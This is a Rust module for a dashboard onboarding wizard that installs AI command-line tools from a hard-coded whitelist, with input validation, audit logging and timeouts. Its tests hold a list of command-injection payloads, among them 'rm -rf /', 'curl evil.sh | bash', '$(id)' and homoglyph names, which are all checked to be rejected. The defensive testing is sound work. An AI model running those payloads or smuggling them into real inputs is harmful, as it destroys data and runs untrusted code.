//! One-click AI CLI installation for the dashboard onboarding wizard (WP2 / D16).
//!
//! The welcome wizard detects which AI backend CLIs are present
//! ([`crate::handlers`] `runtime.detect`). When one is missing, the user should
//! be able to press **「幫我安裝」** and have the gateway install it — instead of
//! being told to go open a terminal, which is exactly where first-time users
//! give up.
//!
//! ## Security model (READ THIS BEFORE ADDING A PROVIDER)
//!
//! Running installers on behalf of a web client is a remote-code-execution
//! surface if it is even slightly parameterised. It is therefore locked down to
//! the narrowest thing that still works:
//!
//! 1. **Hard-coded whitelist.** The only input is a provider *name*, matched
//!    for exact equality against [`SPECS`]. There is no package/version/URL/flag
//!    parameter — the command that runs is a compile-time constant. An unknown
//!    name (including any shell metacharacter payload) is rejected outright;
//!    there is no default arm that could silently install "something".
//! 2. **No shell for npm installs.** `npm install -g <pkg>` is spawned argv-wise
//!    (program + fixed args), so nothing is ever parsed by a shell.
//! 3. **Fail closed.** Missing prerequisite, unsupported platform, or an
//!    unmapped provider all *decline to run anything* and return the exact
//!    manual command instead — a copyable fallback, never a dead end.
//! 4. **Admin-only + audited.** The RPC gate lives in `handlers.rs`
//!    (`require_admin!`); start and finish both append a `security_audit.jsonl`
//!    event.
//! 5. **Bounded.** One install per provider at a time (process-global guard)
//!    and a hard [`INSTALL_TIMEOUT`] wall clock, after which the child is killed.
//!
//! ## Where the install commands come from
//!
//! Every command below is the one this repo already uses in
//! `container/Dockerfile.server` — i.e. the channel DuDuClaw itself ships and
//! smoke-tests, not a guess:
//!
//! | provider | command | source |
//! |---|---|---|
//! | `claude` | `npm install -g @anthropic-ai/claude-code` | `Dockerfile.server:53-56`, `docs/guides/docker.md:30`, `docs/guides/docker.md:231` |
//! | `codex` | `npm install -g @openai/codex` | `Dockerfile.server:53-56`, `docs/guides/docker.md:30` |
//! | `gemini` | `npm install -g @google/gemini-cli` | `Dockerfile.server:53-56`, `docs/guides/docker.md:30` |
//! | `antigravity` | `curl -fsSL https://antigravity.google/cli/install.sh \| bash` | `Dockerfile.server:66`, `docs/todo/TODO-antigravity-cli-migration.md:25` |
//! | `grok` | `curl -fsSL https://x.ai/cli/install.sh \| bash` | `Dockerfile.server:84`, `runtime/grok.rs:4-5` |
//!
//! Two of those are deliberately **manual-only** (`auto = false`) despite having
//! a known command — see [`InstallChannel::Manual`] for the per-provider reason.
//! Guessing an install channel for an unlisted provider is forbidden: add it
//! here only with a verified source, otherwise it stays unknown and is rejected.

use std::collections::HashSet;
use std::path::PathBuf;
use std::sync::{Mutex, OnceLock};
use std::time::Duration;

use serde_json::{json, Value};

/// Wall-clock cap for one install run. `npm install -g` on a cold cache over a
/// slow link is the worst case; past this the child is killed and the UI gets a
/// `timeout` status plus the manual command.
pub const INSTALL_TIMEOUT: Duration = Duration::from_secs(300);

/// How a CLI gets installed.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum InstallChannel {
    /// `npm install -g <package>`. Spawned argv-wise (no shell), works on
    /// macOS / Linux / Windows, and lands the binary somewhere
    /// [`duduclaw_core::which_cli_in_home`] already probes.
    Npm { package: &'static str },
    /// Vendor's official POSIX install script, run as `bash -c "<command>"`.
    /// Unix only — the script is `sh`-flavoured, so Windows falls back to
    /// manual. The install target must be a directory `which_cli_in_home`
    /// probes, otherwise the post-install re-detect would report "still not
    /// installed" and the flow would look broken.
    PosixScript {
        /// Full command line, a compile-time constant. Never assembled from
        /// caller input.
        command: &'static str,
    },
    /// Known command, but this gateway deliberately does not run it. `reason`
    /// is a stable machine code the UI maps to an explanation; `command` is
    /// shown for the user to paste into a terminal.
    Manual {
        command: &'static str,
        reason: &'static str,
    },
}

/// One provider's install recipe.
#[derive(Clone, Copy)]
pub struct InstallSpec {
    /// Canonical provider id (the value `runtime.detect` keys on).
    pub provider: &'static str,
    /// Binary name, for logs and diagnostics.
    pub binary: &'static str,
    pub channel: InstallChannel,
    /// Vendor documentation — the "我自己來" escape hatch in the UI.
    pub docs_url: &'static str,
    /// PATH-first probe — **the same `which_*` `runtime.detect` calls for this
    /// CLI**. Stored as a function pointer rather than resolved from
    /// `binary` via the generic `which_cli`, because the per-CLI probes are
    /// materially richer: `which_claude` also walks NVM version dirs, Volta,
    /// bun, asdf shims and `.claude/bin`, and `which_grok` falls back to the
    /// third-party `grok-cli`. Using the generic probe here would report a
    /// perfectly good NVM/Scoop install as "still missing" and turn a
    /// successful install into a phantom failure.
    probe: fn() -> Option<String>,
    /// HOME-rooted probe, same family as [`Self::probe`].
    probe_in_home: fn(&std::path::Path) -> Option<String>,
}

impl std::fmt::Debug for InstallSpec {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.debug_struct("InstallSpec")
            .field("provider", &self.provider)
            .field("binary", &self.binary)
            .field("channel", &self.channel)
            .finish()
    }
}

/// The whitelist. Exhaustive: anything not here is unknown and is rejected.
const SPECS: &[InstallSpec] = &[
    InstallSpec {
        provider: "claude",
        binary: "claude",
        // npm-global first, matching the README's recommended path and the
        // Windows story (`@anthropic-ai/claude-code` ships a real `claude.exe`
        // inside the npm package — see CHANGELOG v1.x "claude.exe" notes).
        channel: InstallChannel::Npm { package: "@anthropic-ai/claude-code" },
        docs_url: "https://docs.anthropic.com/en/docs/claude-code",
        probe: duduclaw_core::which_claude,
        probe_in_home: duduclaw_core::which_claude_in_home,
    },
    InstallSpec {
        provider: "codex",
        binary: "codex",
        channel: InstallChannel::Npm { package: "@openai/codex" },
        docs_url: "https://github.com/openai/codex",
        probe: duduclaw_core::which_codex,
        probe_in_home: duduclaw_core::which_codex_in_home,
    },
    InstallSpec {
        provider: "gemini",
        binary: "gemini",
        channel: InstallChannel::Npm { package: "@google/gemini-cli" },
        docs_url: "https://github.com/google-gemini/gemini-cli",
        probe: duduclaw_core::which_gemini,
        probe_in_home: duduclaw_core::which_gemini_in_home,
    },
    InstallSpec {
        provider: "antigravity",
        binary: "agy",
        // Google's official installer drops `agy` in `$HOME/.local/bin`, which
        // is the FIRST candidate `which_cli_in_home` probes — so the
        // post-install re-detect turns green without any PATH surgery.
        channel: InstallChannel::PosixScript {
            command: "curl -fsSL https://antigravity.google/cli/install.sh | bash",
        },
        docs_url: "https://antigravity.google/docs/cli",
        probe: duduclaw_core::which_agy,
        probe_in_home: duduclaw_core::which_agy_in_home,
    },
    InstallSpec {
        provider: "grok",
        binary: "grok",
        // Manual on purpose. xAI's installer puts the binary at
        // `$HOME/.grok/bin/grok` (see container/Dockerfile.server:76-83, which
        // has to relocate it to /usr/local/bin). `which_cli_in_home` does NOT
        // probe `~/.grok/bin`, so an auto-install would finish successfully and
        // the wizard would still say "未安裝" — a worse experience than telling
        // the user up front. Revisit if the core probe list gains `~/.grok/bin`.
        channel: InstallChannel::Manual {
            command: "curl -fsSL https://x.ai/cli/install.sh | bash",
            reason: "install_target_not_on_probe_path",
        },
        docs_url: "https://docs.x.ai/build/cli",
        probe: duduclaw_core::which_grok,
        probe_in_home: duduclaw_core::which_grok_in_home,
    },
];

/// Look up a provider's install recipe.
///
/// Matching is exact (after trimming + ASCII-lowercasing) against the
/// whitelist, plus the one documented alias `agy` → `antigravity` that the rest
/// of the codebase already accepts. Anything else — an unknown CLI name, a
/// shell payload, a path, an npm package name — returns `None`. Deliberately
/// **not** built on `RuntimeType::parse`, whose unknown arm falls back to a
/// default runtime; here an unrecognised name must never resolve to a command.
pub fn spec_for(provider: &str) -> Option<&'static InstallSpec> {
    // Length gate FIRST, before any allocation: every legitimate provider name
    // is under a dozen bytes, so a megabyte-long argument is a probe, not a
    // typo, and must not cost us a megabyte-long lowercase copy per call.
    let trimmed = provider.trim();
    if trimmed.is_empty() || trimmed.len() > 32 {
        return None;
    }
    let key = trimmed.to_ascii_lowercase();
    // Reject anything that isn't a bare ASCII identifier before it can even be
    // compared — cheap defence in depth so a payload can never reach the table.
    // ASCII-only also rules out homoglyphs (Cyrillic `с`, fullwidth `ａ`),
    // which `to_ascii_lowercase` leaves untouched and which would otherwise
    // rely solely on the table comparison to fail.
    if !key.chars().all(|c| c.is_ascii_lowercase() || c == '_') {
        return None;
    }
    let canonical = if key == "agy" { "antigravity" } else { key.as_str() };
    SPECS.iter().find(|s| s.provider == canonical)
}

/// The command string shown to the user (and copied to the clipboard on
/// fallback). Always the human-readable one-liner, even for the argv-spawned
/// npm path.
pub fn command_display(spec: &InstallSpec) -> String {
    match spec.channel {
        InstallChannel::Npm { package } => format!("npm install -g {package}"),
        InstallChannel::PosixScript { command } => command.to_string(),
        InstallChannel::Manual { command, .. } => command.to_string(),
    }
}

/// Can this gateway actually run the install itself?
///
/// `windows` is a parameter rather than a `cfg!` so the platform rule is unit
/// testable on any host.
pub fn auto_installable(spec: &InstallSpec, windows: bool) -> bool {
    match spec.channel {
        InstallChannel::Npm { .. } => true,
        InstallChannel::PosixScript { .. } => !windows,
        InstallChannel::Manual { .. } => false,
    }
}

/// Machine-readable reason an auto-install is declined, or `None` when it can
/// run. Kept next to [`auto_installable`] so the two never drift.
pub fn decline_reason(spec: &InstallSpec, windows: bool) -> Option<&'static str> {
    match spec.channel {
        InstallChannel::Npm { .. } => None,
        InstallChannel::PosixScript { .. } => {
            if windows {
                Some("posix_script_on_windows")
            } else {
                None
            }
        }
        InstallChannel::Manual { reason, .. } => Some(reason),
    }
}

/// Is the CLI already on this host?
///
/// Runs the provider's own `which_*` pair — byte-for-byte the probe
/// `runtime.detect` uses — so "installed" means exactly the same thing in the
/// post-install check and in the wizard's badges. PATH first (the user's own
/// environment), then the HOME-rooted candidate scan, matching
/// `handle_runtime_detect`.
pub fn detect_binary(spec: &InstallSpec) -> bool {
    let user_home = PathBuf::from(duduclaw_core::platform::home_dir());
    (spec.probe)()
        .or_else(|| (spec.probe_in_home)(&user_home))
        .is_some()
}

// ── concurrency guard ────────────────────────────────────────────────────────

/// Providers with an install currently running. Process-global (not per-
/// connection) so two dashboard tabs can't race two `npm install -g` on the
/// same package.
fn in_flight() -> &'static Mutex<HashSet<&'static str>> {
    static IN_FLIGHT: OnceLock<Mutex<HashSet<&'static str>>> = OnceLock::new();
    IN_FLIGHT.get_or_init(|| Mutex::new(HashSet::new()))
}

fn try_claim(provider: &'static str) -> bool {
    in_flight()
        .lock()
        .map(|mut s| s.insert(provider))
        .unwrap_or(false)
}

fn release(provider: &'static str) {
    if let Ok(mut s) = in_flight().lock() {
        s.remove(provider);
    }
}

// ── who asked ────────────────────────────────────────────────────────────────

/// The authenticated admin behind an install request, for the audit trail.
/// Carried explicitly (rather than defaulting to `"system"`) so
/// `security_audit.jsonl` can answer "who installed this on the host".
#[derive(Debug, Clone)]
pub struct Actor {
    pub user_id: String,
    pub email: String,
}

impl Actor {
    pub fn new(user_id: impl Into<String>, email: impl Into<String>) -> Self {
        Self { user_id: user_id.into(), email: email.into() }
    }
}

// ── outcome of a start attempt ───────────────────────────────────────────────

/// Result of `runtime.install`. Both variants are `ok` responses: a decline is
/// a normal, actionable answer (here is the command to paste), not an error.
/// Genuinely invalid input (unknown provider) is an error response instead.
#[derive(Debug)]
pub enum StartOutcome {
    /// A child process is running; progress arrives as
    /// `runtime.install.output` / `runtime.install.status` events.
    Started { session_id: String, command: String },
    /// Nothing was run. `reason` is one of:
    /// `already_installed` / `already_running` / `prerequisite_missing` /
    /// `posix_script_on_windows` / `install_target_not_on_probe_path` /
    /// `spawn_failed`.
    Declined {
        reason: &'static str,
        command: String,
        /// Prerequisite the user must install first (e.g. `npm`), when known.
        prerequisite: Option<&'static str>,
    },
}

impl StartOutcome {
    /// JSON payload for the `runtime.install` response.
    pub fn to_payload(&self, spec: &InstallSpec) -> Value {
        match self {
            Self::Started { session_id, command } => json!({
                "started": true,
                "provider": spec.provider,
                "session_id": session_id,
                "command": command,
                "docs_url": spec.docs_url,
                "timeout_secs": INSTALL_TIMEOUT.as_secs(),
            }),
            Self::Declined { reason, command, prerequisite } => json!({
                "started": false,
                "provider": spec.provider,
                "reason": reason,
                "command": command,
                "prerequisite": prerequisite,
                "docs_url": spec.docs_url,
            }),
        }
    }
}

// ── the runner ───────────────────────────────────────────────────────────────

/// Emit an `event` frame onto the dashboard event bus, if one is wired.
/// Uses the real [`crate::protocol::WsFrame`] so the wire shape can't drift
/// from the rest of the gateway's events.
fn emit(tx: &Option<tokio::sync::broadcast::Sender<String>>, event: &str, payload: Value) {
    let Some(tx) = tx else { return };
    let frame = crate::protocol::WsFrame::Event {
        event: event.to_string(),
        payload,
        seq: None,
        state_version: None,
    };
    if let Ok(s) = serde_json::to_string(&frame) {
        let _ = tx.send(s);
    }
}

/// Kill a timed-out install **and everything it spawned**, then reap it.
///
/// `start_kill()` alone is not enough for the `PosixScript` channel: that child
/// is a `bash -c "curl … | bash"` pipeline, and signalling only the shell leaves
/// `curl` and the vendor script running as orphans — still writing to the
/// filesystem long after the dashboard has been told the install timed out.
/// The child is spawned into its own process group (`process_group(0)`), so a
/// single `killpg` takes the whole tree.
///
/// Awaiting the reap here is load-bearing: the caller releases the per-provider
/// in-flight guard immediately afterwards.
async fn terminate_group(child: &mut tokio::process::Child) {
    #[cfg(unix)]
    {
        use nix::sys::signal::{killpg, Signal};
        use nix::unistd::Pid;
        if let Some(pid) = child.id() {
            // ESRCH just means the group is already gone (the child exited
            // between the timeout firing and this call) — not an error.
            match killpg(Pid::from_raw(pid as i32), Signal::SIGKILL) {
                Ok(()) | Err(nix::errno::Errno::ESRCH) => {}
                Err(e) => {
                    tracing::warn!(target: "runtime_install", pid, error = %e, "killpg failed; falling back to direct kill");
                    let _ = child.start_kill();
                }
            }
        } else {
            // No pid ⇒ already reaped by the runtime.
            let _ = child.start_kill();
        }
    }
    #[cfg(windows)]
    {
        // LIMITATION (accepted, documented): Windows has no process-group
        // signal, so this terminates the child only — any grandchildren it
        // spawned survive. It is adequate for what actually runs here: the
        // `PosixScript` channel declines on Windows (see `decline_reason`), so
        // the only Windows child is `npm install -g`, which does not outlive
        // its own process. A Win32 Job Object would be the correct fix if a
        // shell-pipeline channel ever ships for Windows.
        let _ = child.start_kill();
    }
    // Reap. Without this the process stays a zombie and the in-flight guard
    // would be released while it is still winding down.
    let _ = child.wait().await;
}

/// Start an install for `spec`. Returns as soon as the child is spawned; the
/// run itself is a detached task that streams `runtime.install.output` and ends
/// with exactly one `runtime.install.status`.
///
/// `home_dir` is the DuDuClaw home (`~/.duduclaw`) — used only for the audit
/// log, never for binary discovery. `actor` identifies the admin who pressed
/// the button: running an installer is a privileged, host-mutating action, so
/// the audit trail has to name a person, not "system".
pub async fn start_install(
    spec: &'static InstallSpec,
    home_dir: PathBuf,
    actor: Actor,
    event_tx: Option<tokio::sync::broadcast::Sender<String>>,
) -> StartOutcome {
    let command = command_display(spec);

    // Already there → don't reinstall; the caller just needs to re-detect.
    if detect_binary(spec) {
        return StartOutcome::Declined {
            reason: "already_installed",
            command,
            prerequisite: None,
        };
    }

    if let Some(reason) = decline_reason(spec, cfg!(windows)) {
        return StartOutcome::Declined { reason, command, prerequisite: None };
    }

    // Build the child. `program`/`args` are derived from the compile-time
    // channel only — no caller value reaches either.
    let (program, args): (String, Vec<String>) = match spec.channel {
        InstallChannel::Npm { package } => {
            let Some(npm) = duduclaw_core::which_cli("npm") else {
                return StartOutcome::Declined {
                    reason: "prerequisite_missing",
                    command,
                    prerequisite: Some("npm"),
                };
            };
            (
                npm,
                vec!["install".into(), "-g".into(), package.to_string()],
            )
        }
        InstallChannel::PosixScript { command: script } => {
            // `bash -c <constant>`. The constant is the whole pipeline; nothing
            // is interpolated. Resolved to an absolute path rather than spawned
            // by bare name so the shell we run is the one PATH resolution found
            // now — and so a host without bash declines cleanly instead of
            // surfacing as an opaque `spawn_failed`.
            let Some(bash) = duduclaw_core::which_cli("bash") else {
                return StartOutcome::Declined {
                    reason: "prerequisite_missing",
                    command,
                    prerequisite: Some("bash"),
                };
            };
            (bash, vec!["-c".into(), script.to_string()])
        }
        // Unreachable: `decline_reason` returned `Some` for Manual above.
        InstallChannel::Manual { reason, .. } => {
            return StartOutcome::Declined { reason, command, prerequisite: None };
        }
    };

    if !try_claim(spec.provider) {
        return StartOutcome::Declined {
            reason: "already_running",
            command,
            prerequisite: None,
        };
    }

    let mut cmd = tokio::process::Command::new(&program);
    cmd.args(&args)
        .stdin(std::process::Stdio::null())
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped())
        // npm's progress bar / colour codes are noise in a web <pre>.
        .env("NO_COLOR", "1")
        .env("NPM_CONFIG_COLOR", "false")
        .env("NPM_CONFIG_PROGRESS", "false")
        .env("NPM_CONFIG_FUND", "false")
        .env("NPM_CONFIG_AUDIT", "false");
    // Own process group so the timeout kill takes the whole `curl | bash`
    // pipeline, not just the shell.
    #[cfg(unix)]
    cmd.process_group(0);

    let mut child = match cmd.spawn() {
        Ok(c) => c,
        Err(e) => {
            release(spec.provider);
            tracing::warn!(target: "runtime_install", provider = spec.provider, error = %e, "spawn failed");
            return StartOutcome::Declined {
                reason: "spawn_failed",
                command,
                prerequisite: None,
            };
        }
    };

    let session_id = uuid::Uuid::new_v4().simple().to_string();

    audit(
        &home_dir,
        "runtime_install_started",
        &actor,
        duduclaw_security::audit::Severity::Warning,
        json!({
            "provider": spec.provider,
            "session_id": session_id,
            "command": command,
        }),
    );

    let sid = session_id.clone();
    let cmd_display = command.clone();
    tokio::spawn(async move {
        use tokio::io::{AsyncBufReadExt, BufReader};

        let stdout = child.stdout.take();
        let stderr = child.stderr.take();
        let (line_tx, mut line_rx) = tokio::sync::mpsc::channel::<String>(256);

        if let Some(out) = stdout {
            let tx = line_tx.clone();
            tokio::spawn(async move {
                let mut lines = BufReader::new(out).lines();
                while let Ok(Some(l)) = lines.next_line().await {
                    if tx.send(l).await.is_err() {
                        break;
                    }
                }
            });
        }
        if let Some(err) = stderr {
            let tx = line_tx.clone();
            tokio::spawn(async move {
                let mut lines = BufReader::new(err).lines();
                while let Ok(Some(l)) = lines.next_line().await {
                    if tx.send(l).await.is_err() {
                        break;
                    }
                }
            });
        }
        drop(line_tx);

        // Pump output until the child exits or the wall clock runs out.
        let pump = async {
            loop {
                tokio::select! {
                    line = line_rx.recv() => match line {
                        Some(l) => emit(
                            &event_tx,
                            "runtime.install.output",
                            json!({ "session_id": sid, "provider": spec.provider, "data": format!("{l}\n") }),
                        ),
                        None => break,
                    },
                    status = child.wait() => {
                        // Child gone; drain whatever is still buffered.
                        while let Ok(l) = line_rx.try_recv() {
                            emit(
                                &event_tx,
                                "runtime.install.output",
                                json!({ "session_id": sid, "provider": spec.provider, "data": format!("{l}\n") }),
                            );
                        }
                        return status.ok().and_then(|s| s.code());
                    }
                }
            }
            child.wait().await.ok().and_then(|s| s.code())
        };

        // Bind the result in its own statement so the timeout future (and its
        // borrow of `child`) is dropped before the kill path touches `child`.
        let pumped = tokio::time::timeout(INSTALL_TIMEOUT, pump).await;
        let (status, exit_code) = match pumped {
            Ok(code) => {
                if code == Some(0) {
                    ("succeeded", code)
                } else {
                    ("failed", code)
                }
            }
            Err(_) => {
                terminate_group(&mut child).await;
                ("timeout", None)
            }
        };

        // Only now, with the child reaped (`terminate_group` waits), is it safe
        // to let another install of this provider start. Releasing before the
        // reap would let a second `npm install -g` run against the same global
        // prefix while the first was still dying.
        release(spec.provider);

        // Authoritative answer for the UI: is the binary actually there now?
        // A zero exit that somehow didn't produce a usable binary must not turn
        // the wizard green.
        let detected = tokio::task::spawn_blocking(|| detect_binary(spec))
            .await
            .unwrap_or(false);
        let final_status = if status == "succeeded" && !detected {
            "failed"
        } else {
            status
        };

        audit(
            &home_dir,
            "runtime_install_finished",
            &actor,
            if final_status == "succeeded" {
                duduclaw_security::audit::Severity::Info
            } else {
                duduclaw_security::audit::Severity::Warning
            },
            json!({
                "provider": spec.provider,
                "session_id": sid,
                "status": final_status,
                "exit_code": exit_code,
                "detected": detected,
            }),
        );

        tracing::info!(
            target: "runtime_install",
            provider = spec.provider,
            status = final_status,
            detected,
            "install finished"
        );

        emit(
            &event_tx,
            "runtime.install.status",
            json!({
                "session_id": sid,
                "provider": spec.provider,
                "status": final_status,
                "exit_code": exit_code,
                "detected": detected,
                // Always hand back the manual command so a failure is a
                // fallback, not a dead end.
                "command": cmd_display,
                "docs_url": spec.docs_url,
            }),
        );
    });

    StartOutcome::Started { session_id, command }
}

/// Append one audit row attributed to the requesting admin. The email rides in
/// `details` so the actor column stays a stable id.
fn audit(
    home_dir: &std::path::Path,
    event_type: &str,
    actor: &Actor,
    severity: duduclaw_security::audit::Severity,
    mut details: Value,
) {
    if let Some(obj) = details.as_object_mut() {
        obj.insert("actor_email".into(), json!(actor.email));
    }
    duduclaw_security::audit::append_audit_event(
        home_dir,
        &duduclaw_security::audit::AuditEvent::new(
            event_type,
            actor.user_id.as_str(),
            severity,
            details,
        ),
    );
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn maps_every_supported_provider_to_its_documented_command() {
        // Sources are recorded in the module doc table; these assertions are the
        // executable copy so a typo in a package name fails the build's tests.
        let cases = [
            ("claude", "npm install -g @anthropic-ai/claude-code"),
            ("codex", "npm install -g @openai/codex"),
            ("gemini", "npm install -g @google/gemini-cli"),
            (
                "antigravity",
                "curl -fsSL https://antigravity.google/cli/install.sh | bash",
            ),
            ("grok", "curl -fsSL https://x.ai/cli/install.sh | bash"),
        ];
        for (provider, expected) in cases {
            let spec = spec_for(provider).unwrap_or_else(|| panic!("{provider} must be mapped"));
            assert_eq!(command_display(spec), expected, "{provider}");
            assert!(spec.docs_url.starts_with("https://"), "{provider} docs url");
        }
    }

    #[test]
    fn agy_is_an_alias_for_antigravity() {
        let a = spec_for("agy").expect("agy alias");
        let b = spec_for("antigravity").expect("antigravity");
        assert_eq!(a.provider, b.provider);
        assert_eq!(a.binary, "agy");
    }

    #[test]
    fn provider_lookup_is_case_and_whitespace_tolerant() {
        assert_eq!(spec_for("  CLAUDE ").map(|s| s.provider), Some("claude"));
    }

    #[test]
    fn unknown_providers_are_rejected_with_no_fallback() {
        for name in [
            "",
            "   ",
            "openai_compat", // real runtime, but API-key only — nothing to install
            "node",
            "npm",
            "claude-code",
            "anthropic",
            "Claude Code",
        ] {
            assert!(spec_for(name).is_none(), "{name:?} must not resolve");
        }
    }

    #[test]
    fn injection_attempts_never_resolve_to_a_command() {
        // Every one of these would be catastrophic if it reached a shell. The
        // whitelist must reject them *before* any command is built.
        for payload in [
            "claude; rm -rf /",
            "claude && curl evil.sh | bash",
            "claude|whoami",
            "claude`id`",
            "claude$(id)",
            "claude\nrm -rf /",
            "claude --registry=http://evil.test",
            "../../bin/sh",
            "claude/../codex",
            "@anthropic-ai/claude-code",
            "claude'",
            "claude\"",
            // Homoglyphs. `to_ascii_lowercase` leaves non-ASCII untouched, so
            // these reach the comparison looking (to a human) exactly like
            // "claude" while being different bytes. The ASCII-only gate is what
            // stops them; without it the only thing between a lookalike and the
            // table would be byte equality, which is easy to regress.
            "сlaude",  // U+0441 CYRILLIC SMALL LETTER ES
            "clａude", // U+FF41 FULLWIDTH LATIN SMALL LETTER A
            "claudе",  // U+0435 CYRILLIC SMALL LETTER IE
            "ｃｌａｕｄｅ", // fully fullwidth
        ] {
            assert!(
                spec_for(payload).is_none(),
                "{payload:?} must not resolve to an install command"
            );
        }
    }

    #[test]
    fn oversized_input_is_rejected_without_allocating_a_copy_of_it() {
        // A megabyte of 'a' is a probe, not a typo. The length gate runs before
        // `to_ascii_lowercase`, so this costs a comparison rather than a 1 MB
        // allocation per call — otherwise the RPC is a cheap memory-pressure
        // lever for any admin-authenticated client.
        let huge = "a".repeat(1024 * 1024);
        assert!(spec_for(&huge).is_none());
        // Same length, but prefixed with a real provider name.
        let huge_prefixed = format!("claude{}", "a".repeat(1024 * 1024));
        assert!(spec_for(&huge_prefixed).is_none());
        // Padded with whitespace so the trim runs first — still rejected.
        let huge_padded = format!("   {huge}   ");
        assert!(spec_for(&huge_padded).is_none());
        // The longest legitimate name is comfortably inside the gate.
        assert!(spec_for("antigravity").is_some());
    }

    #[test]
    fn every_spec_probes_with_its_own_which_family() {
        // The post-install re-detect must use the SAME probe `runtime.detect`
        // uses. A generic `which_cli(binary)` would miss NVM version dirs /
        // Volta / bun / asdf / `.claude/bin` (claude) and the `grok-cli`
        // fallback (grok), reporting a good install as a failure. Function
        // pointers make that wiring structural: you cannot add a spec without
        // choosing a probe pair.
        let cases: [(&str, fn() -> Option<String>); 5] = [
            ("claude", duduclaw_core::which_claude),
            ("codex", duduclaw_core::which_codex),
            ("gemini", duduclaw_core::which_gemini),
            ("antigravity", duduclaw_core::which_agy),
            ("grok", duduclaw_core::which_grok),
        ];
        for (provider, expected) in cases {
            let spec = spec_for(provider).unwrap();
            assert!(
                std::ptr::fn_addr_eq(spec.probe, expected),
                "{provider} must probe with its own which_* function"
            );
        }
    }

    #[test]
    fn npm_channels_are_auto_installable_everywhere() {
        for p in ["claude", "codex", "gemini"] {
            let spec = spec_for(p).unwrap();
            assert!(auto_installable(spec, false), "{p} unix");
            assert!(auto_installable(spec, true), "{p} windows");
            assert_eq!(decline_reason(spec, false), None);
            assert_eq!(decline_reason(spec, true), None);
        }
    }

    #[test]
    fn posix_script_channels_decline_on_windows_only() {
        let spec = spec_for("antigravity").unwrap();
        assert!(auto_installable(spec, false));
        assert!(!auto_installable(spec, true));
        assert_eq!(decline_reason(spec, false), None);
        assert_eq!(decline_reason(spec, true), Some("posix_script_on_windows"));
    }

    #[test]
    fn manual_channels_never_auto_install_and_explain_why() {
        let spec = spec_for("grok").unwrap();
        assert!(!auto_installable(spec, false));
        assert!(!auto_installable(spec, true));
        assert_eq!(
            decline_reason(spec, false),
            Some("install_target_not_on_probe_path")
        );
        // The user still gets something to paste.
        assert!(command_display(spec).contains("x.ai"));
    }

    #[test]
    fn declined_payload_always_carries_a_copyable_command() {
        let spec = spec_for("grok").unwrap();
        let outcome = StartOutcome::Declined {
            reason: "install_target_not_on_probe_path",
            command: command_display(spec),
            prerequisite: None,
        };
        let v = outcome.to_payload(spec);
        assert_eq!(v["started"], json!(false));
        assert_eq!(v["provider"], json!("grok"));
        assert!(v["command"].as_str().unwrap().contains("x.ai"));
        assert!(v["docs_url"].as_str().unwrap().starts_with("https://"));
    }

    #[test]
    fn started_payload_exposes_session_and_timeout() {
        let spec = spec_for("claude").unwrap();
        let outcome = StartOutcome::Started {
            session_id: "abc123".into(),
            command: command_display(spec),
        };
        let v = outcome.to_payload(spec);
        assert_eq!(v["started"], json!(true));
        assert_eq!(v["session_id"], json!("abc123"));
        assert_eq!(v["timeout_secs"], json!(300));
    }

    #[test]
    fn in_flight_guard_admits_one_claim_at_a_time() {
        // Uses a provider no other test claims, so the global guard is safe here.
        let p = "codex";
        assert!(try_claim(p), "first claim");
        assert!(!try_claim(p), "second concurrent claim must be refused");
        release(p);
        assert!(try_claim(p), "claim again after release");
        release(p);
    }

    #[test]
    fn every_spec_binary_is_a_bare_name() {
        for spec in SPECS {
            assert!(
                !spec.binary.contains('/') && !spec.binary.contains('\\'),
                "{} binary must be a bare name",
                spec.provider
            );
            assert!(spec.provider.chars().all(|c| c.is_ascii_lowercase()));
        }
    }
}
